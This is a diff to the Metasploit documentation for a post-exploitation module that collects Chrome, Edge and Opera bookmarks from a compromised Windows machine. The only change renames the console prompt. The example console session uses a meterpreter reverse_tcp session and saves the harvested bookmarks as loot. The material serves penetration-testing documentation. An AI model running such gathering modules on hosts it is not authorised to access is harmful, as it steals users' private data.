@@ -21,12 +21,12 @@ This modules retrieves stored bookmarks for Google Chrome, Microsoft Edge and Op
 ### Windows 11.
 
   ```
-msf6 exploit(multi/handler) > use post/windows/gather/get_bookmarks
+msf exploit(multi/handler) > use post/windows/gather/get_bookmarks
 [*] Using configured payload windows/x64/meterpreter/reverse_tcp
 
-msf6 post(windows/gather/get_bookmarks) > set session 3
+msf post(windows/gather/get_bookmarks) > set session 3
 session => 3
-msf6 post(windows/gather/get_bookmarks) > run
+msf post(windows/gather/get_bookmarks) > run
 
 
 [-] Error loading USER S-1-5-21-1515542607-384395710-682424177-500: Profile doesn't exist or cannot be accessed
@@ -40,7 +40,7 @@ msf6 post(windows/gather/get_bookmarks) > run
 [*] Bookmarks stored: C:/metasploit/apps/pro/loot/20220405164640_default_Edge.bookmarks_245676.txt
 [*] Post module execution completed
 
-msf6 post(windows/gather/get_bookmarks) > loot
+msf post(windows/gather/get_bookmarks) > loot
 
 Loot
 ====
